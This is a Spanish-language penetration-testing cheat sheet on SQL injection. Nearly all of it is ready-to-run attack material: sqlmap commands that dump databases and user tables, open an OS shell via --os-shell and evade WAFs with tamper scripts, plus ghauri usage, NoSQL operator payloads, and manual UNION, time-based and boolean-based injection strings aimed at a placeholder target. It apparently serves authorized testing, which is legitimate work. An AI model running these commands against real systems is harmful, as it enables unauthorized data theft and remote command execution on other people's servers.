# SQL Injection

## sqlmap (estándar)

```bash
# Detección básica
sqlmap -u "https://target.cl/api?id=1" --batch --random-agent

# POST con body
sqlmap -u "https://target.cl/login" --data="username=admin&password=test" -p username --batch

# Cookie auth
sqlmap -u "https://target.cl/profile" --cookie="session=abc123" -p id

# Desde request raw (Burp)
sqlmap -r request.txt -p username --level=5 --risk=3 --batch

# Más agresivo
sqlmap -u "https://target.cl/api?id=1" --level=5 --risk=3 --tamper=space2comment --random-agent

# Dump
sqlmap -u "https://target.cl/api?id=1" --dbs
sqlmap -u "https://target.cl/api?id=1" -D appdb --tables
sqlmap -u "https://target.cl/api?id=1" -D appdb -T users --dump

# Shell OS (si DB lo permite)
sqlmap -u "..." --os-shell
```

Tampers útiles para WAF:
- `space2comment`, `space2plus`, `between`
- `randomcase`, `charunicodeencode`
- `apostrophenullencode`
- Combinables: `--tamper=space2comment,between,randomcase`

## ghauri (alternativa moderna, Go)

Más rápido en blind/time-based. Mejor evasión por defecto.
```bash
ghauri -u "https://target.cl/api?id=1" --batch --level=3
```

## NoSQLMap (MongoDB, CouchDB)

```bash
nosqlmap
```

Payloads NoSQL típicos:
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": "admin", "password": {"$regex": "^a"}}
```

## jSQL (GUI Java, poco usado pero útil)

## Detección manual

Payloads de prueba clásicos:
```
'
"
') OR ('1'='1
" OR "1"="1
1 AND SLEEP(5)
1' AND SLEEP(5)--
1' UNION SELECT NULL--
1' UNION SELECT NULL,NULL--
```

Time-based blind (no error visible):
```sql
1' AND IF(1=1, SLEEP(5), 0)--
1'; WAITFOR DELAY '0:0:5'--   (MSSQL)
1' AND pg_sleep(5)--           (Postgres)
```

Boolean-based blind:
```
1' AND 1=1-- (true)
1' AND 1=2-- (false)
```

## Contextos a probar

- Query string (`?id=`, `?search=`, `?sort=`)
- Body POST (form, JSON, XML)
- Headers (`X-Forwarded-For`, `User-Agent`, `Cookie`, `Referer`)
- JSON params (`{"id": 1}`)
- Order by columns (`?sort=name` → `name; SELECT...`)
- Path params (`/users/1`)
- GraphQL variables

## Anti-patrones

- ❌ Asumir que falta de error = no SQLi (probar time-based).
- ❌ No probar headers (XFF y UA inyectables más comunes de lo que parece).
- ❌ Reportar sqlmap stdout sin convertir a PoC reproducible manualmente.
